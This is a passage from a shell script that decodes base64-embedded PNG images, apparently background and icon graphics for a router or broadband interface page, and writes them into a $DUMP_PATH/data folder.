OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5
hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQ
rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9
rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1d
T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aX
Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7
vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3S
PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKa
RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO
32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21
e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfV
P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i
/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8
IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADq
YAAAOpgAABdvkl/FRgAAAidJREFUeNrs3D9rFFEUhvFnx8UQCSgWwYSAYKtooyJYCdpEbCTB2u/l
B1AsBEHBwtqgEhAMVhY2CQhqYhZignEsci4uywpmZmfmEp8XLuzOsvPnx8y5OwN7emVZEjkFXAam
MP+SPWAV+ALQC8gTwH3gtD6HygB4AGwXseC6iJUyA9wA6MeCCw1s5NjQKMaM3sgYl3LM+BVjf+T1
fnzeds4Dz4uojTOeXJXTB84UUR9NvUwXcemZmikkEFJIIY2QQgoppBFSSCGNkEIKKaQRUkghhTRC
CimkEVJIIYU0QgoppJBGSCGFNEIKKaSQRkghhTRCCimkkEbI5tNvcN3pz+iekUZIIYUU0giZGeSu
DLXzowA2daid7wUHzdI2tKicz8BWqpErelTO6vBk8x54/T/d0k0gZSC+hT9tD1OmmHzXvovA1Q4P
+BWw1sB6N4Gd9Gb0ocVuA/VyoeMz51sbc8DoGdlULgG3abcP2x7wFPjQxsbaggQ4C9ylnRaLX4HH
MaNy1CABTgJLwHyD2/gIPBmuX0cRMtXlxbjcm5hYXtJBZ9MuIFOuALcmVDd/Rj1c6+pguoRMdXOJ
el1Vt4CHbdbDHCFT3VwG5ip891NMKjtdH0QOkKlu3uFw3affAC/optNztpAp14Cb/L2dNnEb+wx4
l9OO5wYJcC5+b06P+WwAPALWc9vpHCHhoDf6PWB2aNl6IA5y3OFcIQGOx6U+G/fKK2T8dOr3AAfp
foF70lD0AAAAAElFTkSuQmCC" | base64 --decode>$DUMP_PATH/data/3g_bg.png

echo "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" | base64 --decode>$DUMP_PATH/data/adsl_bg.png

echo "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" | base64 --decode>$DUMP_PATH/data/app_adsl.png

echo "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
